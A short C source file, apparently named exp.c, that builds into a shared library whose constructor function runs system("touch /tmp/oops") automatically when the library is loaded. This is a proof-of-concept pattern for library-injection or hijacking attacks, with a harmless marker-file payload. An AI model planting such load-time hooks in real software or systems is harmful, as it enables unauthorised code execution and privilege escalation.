#include <stdio.h>
#include <stdlib.h>

/*
build: gcc -shared -o exp.so -fPIC exp.c
*/

static void plugon() __attribute__((constructor));
void plugon() {
    system("touch /tmp/oops");
}
